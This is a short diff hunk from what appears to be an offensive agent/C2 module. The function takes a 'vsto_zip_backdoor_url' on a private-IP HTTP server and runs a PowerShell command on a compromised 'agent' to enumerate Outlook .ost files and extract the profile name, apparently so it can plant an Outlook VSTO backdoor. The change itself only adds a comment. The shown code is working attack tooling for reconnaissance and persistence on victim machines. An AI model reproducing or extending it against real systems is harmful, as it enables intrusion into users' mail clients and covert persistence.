@@ -72,7 +72,7 @@ def run(API, agent_name, vsto_zip_backdoor_url='http://192.168.181.1:8000/antisp
     opts['command'] = r"Get-ChildItem $env:LocalAppData\Microsoft\Outlook\*.ost | % { $_.Name }"
     results = API.agent_run_shell_cmd_with_result(agent_name, opts)
     results = results.replace(".ost", '')
-    if(" -" in results):
+    if(" -" in results): # some OST file has "" - Default Profle...""
         results = results[0:results.index(" -")]
     return results
     
